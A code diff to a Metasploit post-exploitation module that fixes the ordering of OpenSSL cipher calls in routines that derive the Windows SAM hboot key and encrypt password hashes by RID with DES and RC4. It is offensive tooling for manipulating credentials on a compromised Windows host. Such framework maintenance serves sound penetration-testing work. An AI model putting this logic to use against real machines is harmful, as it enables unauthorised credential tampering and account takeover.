@@ -85,6 +85,7 @@ class MetasploitModule < Msf::Post
         hash = Digest::MD5.new
         hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
         rc4 = OpenSSL::Cipher.new("rc4")
+        rc4.decrypt
         rc4.key = hash.digest
         hbootkey  = rc4.update(vf[0x80, 32])
         hbootkey << rc4.final
@@ -167,18 +168,20 @@ class MetasploitModule < Msf::Post
 
         des_k1, des_k2 = rid_to_key(rid)
         d1 = OpenSSL::Cipher.new('des-ecb')
+        d1.encrypt
         d1.padding = 0
         d1.key = des_k1
         d2 = OpenSSL::Cipher.new('des-ecb')
+        d2.encrypt
         d2.padding = 0
         d2.key = des_k2
         md5 = Digest::MD5.new
         md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
         rc4 = OpenSSL::Cipher.new('rc4')
-        rc4.key = md5.digest
         rc4.encrypt
-        d2o  = d2.encrypt.update(hash[8,8])
-        d1o  = d1.encrypt.update(hash[0,8])
+        rc4.key = md5.digest
+        d2o  = d2.update(hash[8,8])
+        d1o  = d1.update(hash[0,8])
         enchash = rc4.update(d1o+d2o)
         return enchash
     end
@@ -192,7 +195,7 @@ class MetasploitModule < Msf::Post
       key = key.ljust(14, "\0")
       keys = create_des_keys(key[0, 14])
       result = ''
-      cipher = OpenSSL::Cipher::DES.new
+      cipher =  OpenSSL::Cipher.new('DES')
       keys.each do |k|
         cipher.encrypt
         cipher.key = k
